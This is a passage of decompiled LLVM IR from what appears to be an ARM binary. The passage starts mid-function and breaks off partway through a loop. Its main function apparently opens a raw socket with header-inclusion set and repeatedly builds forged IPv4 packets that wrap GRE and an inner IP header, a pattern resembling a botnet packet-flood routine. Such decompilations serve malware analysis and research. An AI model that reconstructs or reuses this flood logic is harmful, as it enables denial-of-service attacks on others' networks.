  %v0_9610 = load i32, i32* @r6, align 4
  %v1_9610 = load i32, i32* @sl, align 4
  %v9_9610 = icmp eq i32 %v0_9610, %v1_9610
  store i1 %v9_9610, i1* %cpsr_z.global-to-local, align 1
  %v2_9614 = load i32, i32* %r0.global-to-local, align 4
  %v3_9614 = add i32 %v2_9614, 3
  %v4_9614 = inttoptr i32 %v3_9614 to i8*
  store i8 %v1_9614, i8* %v4_9614, align 1
  %v0_9618 = load i32, i32* @r7, align 4
  %v1_9618 = trunc i32 %v0_9618 to i8
  %v2_9618 = load i32, i32* %r0.global-to-local, align 4
  %v3_9618 = add i32 %v2_9618, 4
  %v4_9618 = inttoptr i32 %v3_9618 to i8*
  store i8 %v1_9618, i8* %v4_9618, align 1
  %v0_961c = load i32, i32* @r6, align 4
  store i32 %v0_961c, i32* %stack_var_-40, align 4
  %v5_9620 = icmp slt i32 %v0_9610, %v1_9610
  br i1 %v5_9620, label %dec_label_pc_9544, label %dec_label_pc_92e4

; uselistorder directives
  uselistorder i32 %v1_95ac, { 1, 0 }
  uselistorder i32 %v3_951c, { 2, 1, 0 }
  uselistorder i32 %v3_9518, { 1, 0 }
  uselistorder i32 %v7_9514, { 1, 0 }
  uselistorder i32 %v4_94dc, { 1, 0 }
  uselistorder i32 %v0_94d4, { 0, 2, 1 }
  uselistorder i32 %v0_94b8, { 0, 2, 1 }
  uselistorder i32 %v4_94a4, { 1, 0 }
  uselistorder i32 %v0_949c, { 0, 2, 1 }
  uselistorder i32 %v2_9470, { 1, 0 }
  uselistorder i32 %v8_9450, { 2, 0, 1, 3 }
  uselistorder i32 %v3_943c, { 1, 0 }
  uselistorder i32 %v3_9418, { 1, 3, 2, 0 }
  uselistorder i1 %v2_940c, { 1, 0 }
  uselistorder i32 %v1_9400, { 1, 2, 3, 0 }
  uselistorder i32 %v1_93fc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_93a4, { 0, 2, 1 }
  uselistorder i32 %v0_938c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_9378, { 1, 0 }
  uselistorder i32 %v2_9374, { 0, 2, 1 }
  uselistorder i1 %v7_9324, { 2, 1, 0 }
  uselistorder i1 %v3_9490, { 1, 0, 2, 3 }
  uselistorder i8 %v5_91d4, { 0, 2, 1 }
  uselistorder i32 %v3_91c0, { 1, 0 }
  uselistorder i32 %v1_91b0, { 2, 3, 0, 1 }
  uselistorder i32 %v1_91ac, { 1, 2, 0 }
  uselistorder i32 %v1_91a4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_919c, { 1, 0 }
  uselistorder i32 %v1_9174, { 2, 1, 0, 3 }
  uselistorder i32 %v3_9154, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v3_9134, { 2, 1, 4, 3, 0 }
  uselistorder i32 %v0_9130, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_912c, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v3_9120, { 3, 1, 2, 0 }
  uselistorder i1 %v7_910c, { 1, 0 }
  uselistorder i1 %v7_90e0, { 1, 0 }
  uselistorder i32 %v3_90dc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_90c8, { 2, 1, 7, 5, 0, 6, 4, 3 }
  uselistorder i32 %v1_90b4, { 3, 1, 2, 0 }
  uselistorder i32 %v1_9040, { 1, 0 }
  uselistorder i8 %v5_9030, { 1, 0, 2 }
  uselistorder i32 %v5_9014, { 1, 0 }
  uselistorder i8 %v5_8ff8, { 0, 2, 1 }
  uselistorder i32 %v6_8fd8, { 1, 0 }
  uselistorder i32 %v2_8fc0, { 0, 3, 1, 5, 2, 4 }
  uselistorder i32 %v1_8fa4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 14, 13 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 48, 47, 49, 50, 52, 51, 54, 53, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 12, 11, 14, 13, 15, 16, 17, 19, 18, 21, 20, 22, 24, 23, 30, 25, 26, 27, 28, 29, 35, 31, 32, 33, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 240, { 1, 0 }
  uselistorder label %dec_label_pc_9508, { 1, 0 }
  uselistorder label %dec_label_pc_94f0, { 1, 0 }
  uselistorder label %dec_label_pc_9364, { 2, 1, 0 }
  uselistorder label %dec_label_pc_92ec, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
}

define i32 @function_962c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_962c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-50 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_962c = load i32, i32* @r4, align 4
  %v15_962c = load i32, i32* @r8, align 4
  %v21_962c = load i32, i32* @sl, align 4
  %v1_9630 = urem i32 %arg1, 256
  store i32 %v1_9630, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_9630, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_9648 = urem i32 %arg3, 256
  store i32 %v1_9648, i32* @r4, align 4
  %v2_964c = call i32 @function_126cc(i32 %v1_9630, i32 4)
  %v0_9650 = load i32, i32* @r5, align 4
  store i32 %v0_9650, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9660 = load i32, i32* @r4, align 4
  store i32 %v0_9660, i32* %r0.global-to-local, align 4
  %v5_9664 = inttoptr i32 %v0_9650 to i32*
  %v6_9664 = call i32 @function_85e0(i32 %v0_9660, i32* %v5_9664, i32 2, i32 0)
  %v1_9670 = urem i32 %v6_9664, 256
  store i32 %v1_9670, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_967c = load i32, i32* @r5, align 4
  store i32 %v0_967c, i32* %r1.global-to-local, align 4
  %v0_9680 = load i32, i32* @r4, align 4
  store i32 %v0_9680, i32* %r0.global-to-local, align 4
  %v5_9684 = trunc i32 %v6_9664 to i8
  %v6_9688 = inttoptr i32 %v0_967c to i32*
  %v7_9688 = call i32 @function_85e0(i32 %v0_9680, i32* %v6_9688, i32 3, i32 65535)
  %v0_968c = load i32, i32* @r5, align 4
  store i32 %v0_968c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9688, i32* @r7, align 4
  %v0_969c = load i32, i32* @r4, align 4
  store i32 %v0_969c, i32* %r0.global-to-local, align 4
  %v4_96a0 = inttoptr i32 %v0_968c to i32*
  %v5_96a0 = call i32 @function_85e0(i32 %v0_969c, i32* %v4_96a0, i32 4, i32 64)
  %v1_96a8 = urem i32 %v5_96a0, 256
  store i32 %v1_96a8, i32* %ip.global-to-local, align 4
  %v0_96ac = load i32, i32* @r5, align 4
  store i32 %v0_96ac, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96b8 = load i32, i32* @r4, align 4
  store i32 %v0_96b8, i32* %r0.global-to-local, align 4
  %v5_96bc = trunc i32 %v5_96a0 to i8
  %v6_96c0 = inttoptr i32 %v0_96ac to i32*
  %v7_96c0 = call i32 @function_85e0(i32 %v0_96b8, i32* %v6_96c0, i32 5, i32 1)
  %v1_96cc = urem i32 %v7_96c0, 256
  store i32 %v1_96cc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_96d8 = load i32, i32* @r5, align 4
  store i32 %v0_96d8, i32* %r1.global-to-local, align 4
  %v0_96dc = load i32, i32* @r4, align 4
  store i32 %v0_96dc, i32* %r0.global-to-local, align 4
  %v5_96e4 = inttoptr i32 %v0_96d8 to i32*
  %v6_96e4 = call i32 @function_85e0(i32 %v0_96dc, i32* %v5_96e4, i32 6, i32 65535)
  %v0_96ec = load i32, i32* @r5, align 4
  store i32 %v0_96ec, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_96e4, i32* @sl, align 4
  %v0_96fc = load i32, i32* @r4, align 4
  store i32 %v0_96fc, i32* %r0.global-to-local, align 4
  %v4_9700 = inttoptr i32 %v0_96ec to i32*
  %v5_9700 = call i32 @function_85e0(i32 %v0_96fc, i32* %v4_9700, i32 7, i32 65535)
  %v0_9704 = load i32, i32* @r5, align 4
  store i32 %v0_9704, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9700, i32* @r8, align 4
  %v0_9714 = load i32, i32* @r4, align 4
  store i32 %v0_9714, i32* %r0.global-to-local, align 4
  %v4_9718 = inttoptr i32 %v0_9704 to i32*
  %v5_9718 = call i32 @function_85e0(i32 %v0_9714, i32* %v4_9718, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9728 = load i32, i32* @r5, align 4
  store i32 %v0_9728, i32* %r1.global-to-local, align 4
  %v0_972c = load i32, i32* @r4, align 4
  store i32 %v0_972c, i32* %r0.global-to-local, align 4
  %v4_9730 = inttoptr i32 %v0_9728 to i32*
  %v5_9730 = call i32 @function_85e0(i32 %v0_972c, i32* %v4_9730, i32 1, i32 1)
  %v1_9738 = urem i32 %v5_9730, 256
  store i32 %v1_9738, i32* %ip.global-to-local, align 4
  %v0_973c = load i32, i32* @r5, align 4
  store i32 %v0_973c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9748 = load i32, i32* @r4, align 4
  store i32 %v0_9748, i32* %r0.global-to-local, align 4
  %v5_9750 = inttoptr i32 %v0_973c to i32*
  %v6_9750 = call i32 @function_85e0(i32 %v0_9748, i32* %v5_9750, i32 19, i32 0)
  %v0_9758 = load i32, i32* @r5, align 4
  store i32 %v0_9758, i32* %r1.global-to-local, align 4
  %v2_975c = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_975c, i32* %r3.global-to-local, align 4
  store i32 %v6_9750, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9768 = load i32, i32* @r4, align 4
  store i32 %v0_9768, i32* %r0.global-to-local, align 4
  %v4_976c = inttoptr i32 %v0_9758 to i32*
  %v5_976c = call i32 @function_85e0(i32 %v0_9768, i32* %v4_976c, i32 25, i32 %v2_975c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9780 = call i32 @function_123e0(i32 2, i32 3, i32 6)
  store i32 %v3_9780, i32* %r0.global-to-local, align 4
  %v7_9784 = icmp eq i32 %v3_9780, -1
  store i1 %v7_9784, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9784, label %dec_label_pc_9c68, label %dec_label_pc_9790

dec_label_pc_9790:                                ; preds = %dec_label_pc_962c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_9798 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_9798, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_97ac = call i32 @function_123b0(i32 %v3_9780, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_97ac, i32* %r0.global-to-local, align 4
  %v7_97b0 = icmp eq i32 %v6_97ac, -1
  store i1 %v7_97b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97b0, label %dec_label_pc_9c60, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %dec_label_pc_9790
  %v0_97b8 = load i32, i32* @sl, align 4
  %v3_97b8 = mul i32 %v0_97b8, 65536
  store i32 %v3_97b8, i32* %sl.global-to-local, align 4
  %v0_97bc = load i32, i32* @r8, align 4
  %v3_97bc = mul i32 %v0_97bc, 65536
  store i32 %v3_97bc, i32* %r8.global-to-local, align 4
  %v0_97c4 = load i32, i32* @r7, align 4
  %v3_97c4 = mul i32 %v0_97c4, 65536
  %v0_97c8 = load i32, i32* @r6, align 4
  %v1_97c8 = urem i32 %v0_97c8, 256
  store i32 0, i32* %stack_var_-40, align 4
  %v3_97d0 = urem i32 %v0_97c4, 65536
  store i32 %v3_97d0, i32* %r2.global-to-local, align 4
  %v3_97d4 = urem i32 %v0_97b8, 65536
  store i32 %v3_97d4, i32* %r3.global-to-local, align 4
  %v3_97d8 = urem i32 %v0_97bc, 65536
  store i32 %v3_97d8, i32* %r1.global-to-local, align 4
  %v0_97dc = load i32, i32* @fp, align 4
  %v2_97dc = icmp eq i32 %v0_97dc, 0
  store i1 %v2_97dc, i1* %cpsr_z.global-to-local, align 1
  %tmp88 = icmp slt i32 %v0_97dc, 1
  br i1 %tmp88, label %dec_label_pc_9d88, label %dec_label_pc_97fc

dec_label_pc_97fc:                                ; preds = %dec_label_pc_97b8
  %v3_9800 = mul i32 %v5_9718, 65536
  %v0_97c4.not = or i32 %v0_97c4, -65536
  %v1_9808 = xor i32 %v0_97c4.not, 65535
  %v1_9810 = add i32 %v3_9800, 4325376
  %v1_9814 = urem i32 %v0_97b8, 256
  %v3_981c = udiv i32 %v1_9810, 256
  %v1_9820 = add i32 %v3_9800, 524288
  %v1_9828 = add i32 %v3_9800, 1835008
  %v1_982c = urem i32 %v0_97bc, 256
  %v1_9830 = and i32 %v3_981c, 65280
  store i32 %v1_9830, i32* %r0.global-to-local, align 4
  %v3_9838 = udiv i32 %v1_9828, 256
  %tmp89 = mul nsw i32 %v1_9808, 256
  %v1_9850 = and i32 %v3_9838, 65280
  store i32 %v1_9850, i32* %ip.global-to-local, align 4
  %v1_9854 = and i32 %tmp89, 65280
  store i32 %v1_9854, i32* @lr, align 4
  %tmp91 = udiv i32 %v1_9808, 256
  %v4_9840 = sdiv i32 %v1_9810, 16777216
  %v5_9870 = trunc i32 %tmp91 to i8
  %v3_987c = mul nuw nsw i32 %v1_9814, 256
  %v3_9884 = ashr i32 %v1_9810, 31
  %v3_9888 = mul nuw nsw i32 %v1_982c, 256
  store i32 %v3_9888, i32* @r5, align 4
  %tmp92 = udiv i32 %v0_97b8, 256
  %v4_988c = urem i32 %tmp92, 256
  %v5_988c = or i32 %v4_988c, %v3_987c
  store i32 %v5_988c, i32* @r7, align 4
  %v3_9890 = udiv i32 %v1_9820, 256
  %tmp93 = udiv i32 %v0_97bc, 256
  %v4_9894 = urem i32 %tmp93, 256
  %v5_9894 = or i32 %v4_9894, %v3_9888
  store i32 %v5_9894, i32* %sl.global-to-local, align 4
  %v5_9898 = trunc i32 %v3_9884 to i8
  %v3_98a0 = sdiv i32 %v3_97c4, 16777216
  %v7_98a0 = sdiv i32 %v1_9828, 16777216
  %v1_98a4 = and i32 %v3_9890, 65280
  store i32 %v1_98a4, i32* @r6, align 4
  %v3_98a8 = ashr i32 %v3_97c4, 31
  %v3_98ac = ashr i32 %v1_9828, 31
  %v3_98b0 = udiv i32 %v1_9808, 65536
  %v4_98b4 = udiv i32 %v1_9820, 16777216
  %v5_98b4 = or i32 %v4_98b4, %v1_98a4
  store i32 %v5_98b4, i32* %r8.global-to-local, align 4
  store i32 %v1_9814, i32* %r1.global-to-local, align 4
  store i32 %v1_982c, i32* %r2.global-to-local, align 4
  %v3_98cc37 = udiv i32 %v1_98a4, 256
  store i32 %v3_98cc37, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_992c = sext i8 %v5_96bc to i32
  %v2_9a2c = icmp eq i32 %v1_97c8, 0
  %sext16 = mul i32 %v0_97b8, 16777216
  %v4_9a40 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_9820, 256
  %v4_9a54 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_97bc, 16777216
  %v4_9a5c = sdiv i32 %sext18, 16777216
  %v1_9a64 = trunc i32 %v4_9a54 to i8
  br label %dec_label_pc_98e0

dec_label_pc_98e0:                                ; preds = %bb105, %dec_label_pc_97fc
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_98ec = call i32 @function_126cc(i32 1510, i32 4)
  store i32 %v2_98ec, i32* %r0.global-to-local, align 4
  store i32 %v2_964c, i32* %r1.global-to-local, align 4
  %v3_98f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_98f4, i32* %r3.global-to-local, align 4
  %v2_98f8 = load i32, i32* @r4, align 4
  %v5_98f8 = mul i32 %v2_98f8, 4
  %v6_98f8 = add i32 %v5_98f8, %v2_964c
  %v7_98f8 = inttoptr i32 %v6_98f8 to i32*
  store i32 %v2_98ec, i32* %v7_98f8, align 4
  %v0_98fc = load i32, i32* %r1.global-to-local, align 4
  %v1_98fc = load i32, i32* %r3.global-to-local, align 4
  %v4_98fc = mul i32 %v1_98fc, 4
  %v5_98fc = add i32 %v4_98fc, %v0_98fc
  %v6_98fc = inttoptr i32 %v5_98fc to i32*
  %v7_98fc = load i32, i32* %v6_98fc, align 4
  store i32 %v7_98fc, i32* %r4.global-to-local, align 4
  %v1_9900 = inttoptr i32 %v7_98fc to i8*
  %v2_9900 = load i8, i8* %v1_9900, align 1
  %tmp = urem i8 %v2_9900, 16
  %v1_9904 = zext i8 %tmp to i32
  %v1_9908 = or i32 %v1_9904, 64
  store i32 %v1_9908, i32* %r2.global-to-local, align 4
  %v1_990c = trunc i32 %v1_9908 to i8
  store i8 %v1_990c, i8* %v1_9900, align 1
  %v0_9910 = load i32, i32* %r4.global-to-local, align 4
  %v1_9910 = inttoptr i32 %v0_9910 to i8*
  %v2_9910 = load i8, i8* %v1_9910, align 1
  %v1_9914 = and i8 %v2_9910, -16
  %v1_9918 = or i8 %v1_9914, 5
  store i32 %v1_96cc, i32* %r2.global-to-local, align 4
  store i8 %v1_9918, i8* %v1_9910, align 1
  %v2_9928 = load i32, i32* %r4.global-to-local, align 4
  %v3_9928 = add i32 %v2_9928, 1
  %v4_9928 = inttoptr i32 %v3_9928 to i8*
  store i8 %v5_9684, i8* %v4_9928, align 1
  store i32 %v4_992c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9934 = load i32, i32* %r4.global-to-local, align 4
  %v3_9934 = add i32 %v2_9934, 8
  %v4_9934 = inttoptr i32 %v3_9934 to i8*
  store i8 %v5_96bc, i8* %v4_9934, align 1
  %v0_9938 = load i32, i32* %r2.global-to-local, align 4
  %v1_9938 = load i32, i32* %ip.global-to-local, align 4
  %v9_9938 = icmp eq i32 %v0_9938, %v1_9938
  store i1 %v9_9938, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9884, i32* %r3.global-to-local, align 4
  store i32 %v4_9840, i32* %r2.global-to-local, align 4
  %v2_9944 = load i32, i32* %r4.global-to-local, align 4
  %v3_9944 = add i32 %v2_9944, 3
  %v4_9944 = inttoptr i32 %v3_9944 to i8*
  store i8 %v5_9898, i8* %v4_9944, align 1
  %v0_9948 = load i32, i32* %r2.global-to-local, align 4
  %v1_9948 = trunc i32 %v0_9948 to i8
  %v2_9948 = load i32, i32* %r4.global-to-local, align 4
  %v3_9948 = add i32 %v2_9948, 2
  %v4_9948 = inttoptr i32 %v3_9948 to i8*
  store i8 %v1_9948, i8* %v4_9948, align 1
  %v0_994c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_994c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_98e0
  store i32 %v3_98a8, i32* %r2.global-to-local, align 4
  %extract.t114 = trunc i32 %v3_98a8 to i8
  br label %bb94

bb:                                               ; preds = %dec_label_pc_98e0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v3_98a8, i32* %r2.global-to-local, align 4
  %v3_9954 = load i32, i32* %r4.global-to-local, align 4
  %v4_9954 = add i32 %v3_9954, 6
  %v5_9954 = inttoptr i32 %v4_9954 to i8*
  store i8 64, i8* %v5_9954, align 1
  %v0_995c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t115 = trunc i32 %v0_995c.pre to i8
  br label %bb94

bb94:                                             ; preds = %.thread, %bb
  %v3_98a8.sink.off0 = phi i8 [ %extract.t114, %.thread ], [ %extract.t115, %bb ]
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_995c = load i32, i32* %r4.global-to-local, align 4
  %v3_995c = add i32 %v2_995c, 5
  %v4_995c = inttoptr i32 %v3_995c to i8*
  store i8 %v3_98a8.sink.off0, i8* %v4_995c, align 1
  store i32 %v3_98a0, i32* %r1.global-to-local, align 4
  %v0_9964 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9964, label %bb96, label %bb95

bb95:                                             ; preds = %bb94
  %v1_9964 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_9964, i32* %r2.global-to-local, align 4
  br label %bb96

bb96:                                             ; preds = %bb94, %bb95
  %v0_9968 = load i32, i32* %r3.global-to-local, align 4
  %v1_9968 = trunc i32 %v0_9968 to i8
  %v2_9968 = load i32, i32* %r4.global-to-local, align 4
  %v3_9968 = add i32 %v2_9968, 9
  %v4_9968 = inttoptr i32 %v3_9968 to i8*
  store i8 %v1_9968, i8* %v4_9968, align 1
  %v0_996c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_996c, label %bb98, label %bb97

bb97:                                             ; preds = %bb96
  %v1_996c = load i32, i32* %r2.global-to-local, align 4
  %v2_996c = trunc i32 %v1_996c to i8
  %v3_996c = load i32, i32* %r4.global-to-local, align 4
  %v4_996c = add i32 %v3_996c, 7
  %v5_996c = inttoptr i32 %v4_996c to i8*
  store i8 %v2_996c, i8* %v5_996c, align 1
  br label %bb98

bb98:                                             ; preds = %bb96, %bb97
  %v3_9970 = load i32, i32* %stack_var_-40, align 4
  %v5_9978 = mul i32 %v3_9970, 24
  store i32 %v5_9978, i32* %r3.global-to-local, align 4
  store i32 %v5_976c, i32* %r2.global-to-local, align 4
  %v1_9980 = load i32, i32* %r4.global-to-local, align 4
  %v2_9980 = add i32 %v1_9980, 12
  %v3_9980 = inttoptr i32 %v2_9980 to i32*
  store i32 %v5_976c, i32* %v3_9980, align 4
  %v0_9984 = load i32, i32* %r3.global-to-local, align 4
  %v1_9984 = load i32, i32* @sb, align 4
  %v2_9984 = add i32 %v1_9984, %v0_9984
  store i32 %v2_9984, i32* %r3.global-to-local, align 4
  %v1_9988 = add i32 %v2_9984, 16
  %v2_9988 = inttoptr i32 %v1_9988 to i32*
  %v3_9988 = load i32, i32* %v2_9988, align 4
  store i32 %v3_9988, i32* %r2.global-to-local, align 4
  %v0_998c = load i32, i32* %r1.global-to-local, align 4
  %v1_998c = trunc i32 %v0_998c to i8
  %v2_998c = load i32, i32* %r4.global-to-local, align 4
  %v3_998c = add i32 %v2_998c, 4
  %v4_998c = inttoptr i32 %v3_998c to i8*
  store i8 %v1_998c, i8* %v4_998c, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v0_9994 = load i32, i32* %r4.global-to-local, align 4
  %v1_9994 = add i32 %v0_9994, 20
  store i32 %v1_9994, i32* %r1.global-to-local, align 4
  %v3_9998 = add i32 %v0_9994, 22
  %v4_9998 = inttoptr i32 %v3_9998 to i8*
  store i8 101, i8* %v4_9998, align 1
  %v0_999c = load i32, i32* %r2.global-to-local, align 4
  %v1_999c = load i32, i32* %r4.global-to-local, align 4
  %v2_999c = add i32 %v1_999c, 16
  %v3_999c = inttoptr i32 %v2_999c to i32*
  store i32 %v0_999c, i32* %v3_999c, align 4
  %v0_99a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_99a0 = add i32 %v0_99a0, 24
  store i32 %v1_99a0, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_99a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_99a8 = add i32 %v0_99a8, -93
  store i32 %v1_99a8, i32* %r3.global-to-local, align 4
  %v2_99ac = load i32, i32* %r1.global-to-local, align 4
  %v3_99ac = add i32 %v2_99ac, 3
  %v4_99ac = inttoptr i32 %v3_99ac to i8*
  store i8 88, i8* %v4_99ac, align 1
  %v0_99b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_99b0 = trunc i32 %v0_99b0 to i8
  %v2_99b0 = load i32, i32* %r0.global-to-local, align 4
  %v3_99b0 = add i32 %v2_99b0, 12
  %v4_99b0 = inttoptr i32 %v3_99b0 to i8*
  store i8 %v1_99b0, i8* %v4_99b0, align 1
  %v0_99b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_99b4 = trunc i32 %v0_99b4 to i8
  %v2_99b4 = load i32, i32* %r0.global-to-local, align 4
  %v3_99b4 = add i32 %v2_99b4, 13
  %v4_99b4 = inttoptr i32 %v3_99b4 to i8*
  store i8 %v1_99b4, i8* %v4_99b4, align 1
  %v0_99b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_99b8 = add i32 %v0_99b8, 38
  %v2_99b8 = inttoptr i32 %v1_99b8 to i8*
  %v3_99b8 = load i8, i8* %v2_99b8, align 1
  %tmp116 = urem i8 %v3_99b8, 16
  %v1_99bc = zext i8 %tmp116 to i32
  %v1_99c0 = or i32 %v1_99bc, 64
  store i32 %v1_99c0, i32* %r3.global-to-local, align 4
  %v1_99c4 = trunc i32 %v1_99c0 to i8
  store i8 %v1_99c4, i8* %v2_99b8, align 1
  %v0_99c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_99c8 = add i32 %v0_99c8, 38
  %v2_99c8 = inttoptr i32 %v1_99c8 to i8*
  %v3_99c8 = load i8, i8* %v2_99c8, align 1
  %v1_99cc = and i8 %v3_99c8, -16
  %v1_99d0 = or i8 %v1_99cc, 5
  store i8 %v1_99d0, i8* %v2_99c8, align 1
  %v0_99dc = load i32, i32* %r4.global-to-local, align 4
  %v1_99dc = add i32 %v0_99dc, 38
  store i32 %v1_99dc, i32* @r5, align 4
  %v3_99e0 = add i32 %v0_99dc, 39
  %v4_99e0 = inttoptr i32 %v3_99e0 to i8*
  store i8 %v5_9684, i8* %v4_99e0, align 1
  store i32 %v7_98a0, i32* %r1.global-to-local, align 4
  store i32 %tmp91, i32* %r3.global-to-local, align 4
  store i32 %v3_98ac, i32* %r2.global-to-local, align 4
  %v2_99f0 = load i32, i32* @r5, align 4
  %v3_99f0 = add i32 %v2_99f0, 4
  %v4_99f0 = inttoptr i32 %v3_99f0 to i8*
  store i8 %v5_9870, i8* %v4_99f0, align 1
  %v0_99f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_99f4 = trunc i32 %v0_99f4 to i8
  %v2_99f4 = load i32, i32* @r5, align 4
  %v3_99f4 = add i32 %v2_99f4, 2
  %v4_99f4 = inttoptr i32 %v3_99f4 to i8*
  store i8 %v1_99f4, i8* %v4_99f4, align 1
  %v0_99f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_99f8, label %bb100, label %bb99

bb99:                                             ; preds = %bb98
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb100

bb100:                                            ; preds = %bb98, %bb99
  store i32 %v3_98b0, i32* %r1.global-to-local, align 4
  %v0_9a00 = load i32, i32* %r2.global-to-local, align 4
  %v1_9a00 = trunc i32 %v0_9a00 to i8
  %v2_9a00 = load i32, i32* @r5, align 4
  %v3_9a00 = add i32 %v2_9a00, 3
  %v4_9a00 = inttoptr i32 %v3_9a00 to i8*
  store i8 %v1_9a00, i8* %v4_9a00, align 1
  store i32 %v4_992c, i32* %r2.global-to-local, align 4
